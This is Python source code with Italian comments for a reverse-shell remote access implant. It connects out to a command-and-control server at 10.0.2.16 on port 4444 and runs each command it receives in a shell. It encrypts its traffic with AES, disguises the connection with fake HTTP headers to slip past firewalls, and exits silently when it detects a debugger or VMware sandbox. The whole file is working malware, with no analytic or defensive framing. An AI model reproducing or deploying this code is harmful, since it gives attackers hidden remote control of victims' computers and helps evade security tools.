import socket
import subprocess
import os
import time
import sys
from Crypto.Cipher import AES
import base64
import ctypes
import random

# ===== CONFIGURAZIONE =====
SERVER_IP = "10.0.2.16"  # Cambia con l'IP del C2
SERVER_PORT = 4444        # Porta del server C2
RECONNECT_DELAY = 10      # Secondi tra i tentativi di riconnessione
BUFFER_SIZE = 65536       # Dimensione massima dei dati scambiati
AES_KEY = b"16bytessecretkey!"  # DEVE ESSERE 16, 24 o 32 bytes
# =========================

class AntiAnalysis:
    @staticmethod
    def is_debugger_present():
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False
    
    @staticmethod
    def check_sandbox():
        if os.path.exists("C:\\Windows\\System32\\vmware.exe"):
            return True
        return False

class SecureComms:
    def __init__(self, key):
        self.key = key
    
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext)
    
    def decrypt(self, data):
        raw = base64.b64decode(data)
        nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return result.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[!] Error: {str(e)}"

def fake_http_header():
    headers = [
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n",
        "POST /api/data HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "GET /robots.txt HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    ]
    return random.choice(headers)

def main():
    if AntiAnalysis.is_debugger_present() or AntiAnalysis.check_sandbox():
        sys.exit(0)  # Uscita silenziosa se rileva debugger/sandbox
    
    secure = SecureComms(AES_KEY)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((SERVER_IP, SERVER_PORT))
            
            # Invia un falso header HTTP per confondere i firewall
            s.send(fake_http_header().encode())
            
            while True:
                encrypted_cmd = s.recv(BUFFER_SIZE)
                if not encrypted_cmd:
                    break
                
                cmd = secure.decrypt(encrypted_cmd)
                
                if cmd.lower() == "clean":
                    s.close()
                    return
                
                result = execute_command(cmd)
                encrypted_result = secure.encrypt(result)
                s.send(encrypted_result)
            
        except Exception as e:
            time.sleep(RECONNECT_DELAY)
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    main()